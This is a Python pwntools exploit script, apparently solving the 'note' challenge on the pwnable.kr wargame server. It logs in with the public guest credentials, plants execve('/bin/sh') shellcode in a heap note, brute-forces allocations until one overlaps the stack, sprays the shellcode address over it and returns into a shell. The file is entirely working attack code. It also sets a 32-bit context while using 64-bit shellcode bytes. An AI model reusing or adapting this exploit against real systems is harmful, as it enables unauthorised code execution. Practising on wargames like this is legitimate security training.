#!/usr/bin/env python3
from pwn import *
from sys import argv, exit
from time import sleep
if __name__ == "__main__":
    try:
        if len(argv)>1 and argv[1]=="-r":
            conn=ssh("note", "pwnable.kr", port=2222, password='guest')
            p=conn.process("./note",cwd='/home/note')
        elif argv[1]=="-rp":
            conn=ssh("note", "pwnable.kr", port=2222, password='guest')
            p=conn.remote("127.0.0.1", 9019)
        elif argv[1]=="-l":
            p=process('./note')
    except IndexError:
        print("Usage: python3 %s [-r] [-rp] [-l]"%argv[0])
        print("-r \tremote\n-rp\tremote priv\n-l \tlocal")
        exit(0)
context(arch='i386',os='linux', log_level='DEBUG')
shellcode=b"\x90"*10 + b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
log.warning("sleeping until binary menu finishes")
## define important variables
ind=0
static_stack_addr=0xfffdd000
### allocate note and get address
p.recvuntil("5. exit\n")
p.sendline("1")
p.recvuntil(" [")
shellcode_addr = int(p.recvline().split(b"]")[0],16)
log.info("Allocated note and leaked address: %s"%hex(shellcode_addr))
log.info("writing shellcode to address")
### sending shellcode to index[0] of notes and brute force stack
p.sendline("2")
p.recvuntil("note no?\n")
p.sendline(str(ind))
p.recvuntil("e)\n")
p.sendline(shellcode)
while 1:
    if ind==255:
        ind=1
        for i in range(1,256):
            p.recvuntil("exit\n")
            p.sendline("4")
            p.recvuntil("?\n")
            p.sendline(str(i))
    static_stack_addr-=0x430*254
    p.recvuntil("exit\n")
    p.sendline("1")
    p.recvuntil("[")
    leak=int(p.recvline().split(b"]")[0], 16)
    if static_stack_addr<leak:
        break
    ind+=1
    static_stack_addr-=0x430
p.recvuntil("exit\n")
p.sendline("2")
p.recvuntil("no?\n")
p.sendline(str(ind))
p.recvuntil("e)\n")
p.sendline(p32(shellcode_addr) * 1024)
#p.interactive()
p.recvuntil("exit\n")
p.sendline("5") # ret
p.interactive()
